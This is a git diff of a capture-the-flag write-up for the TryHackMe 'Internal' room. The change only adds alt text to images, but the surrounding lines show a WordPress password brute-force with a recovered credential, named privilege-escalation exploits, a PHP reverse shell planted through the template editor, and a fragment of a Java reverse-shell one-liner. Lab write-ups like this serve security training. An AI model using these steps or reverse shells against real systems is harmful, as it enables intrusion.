@@ -17,7 +17,7 @@ Penetration Testing Challenge
 
 [https://tryhackme.com/room/internal](https://tryhackme.com/room/internal)
 
-![](/assets/hacker-900-350.jpg)
+![0xskar](/assets/hacker-900-350.jpg)
 
 * * *
 
@@ -114,14 +114,14 @@ http://internal.thm/server-status   (Status: 403) [Size: 277]
 
 - Running wpxploit with default wordlist and admin ``./exploit.py http://internal.thm/wordpress/ 5 15`` gives us admin:my2boys for wordpress login.
 
-![](/assets/internal02.png)
+![0xskar](/assets/internal02.png)
 
 ## # Privilege Escalation Vulnerabilities
 
 - Found during linpeas scan Vulnerable to CVE-2021-4034
 - Found during ``wpscan`` - Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation | linux/local/46676.php
 
-1. insert php reverse shell into wordpress template editor and open up reverse shell ![](/assets/internal03.png)
+1. insert php reverse shell into wordpress template editor and open up reverse shell ![0xskar](/assets/internal03.png)
 
 2. browse the machine.
 
@@ -202,11 +202,11 @@ ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,p
 
 **User.txt Flag**
 
-![](/assets/internal04.png)
+![0xskar](/assets/internal04.png)
 
 **Root.txt Flag**
 
-![](/assets/internal05.png)
+![0xskar](/assets/internal05.png)
 
 * * *
 
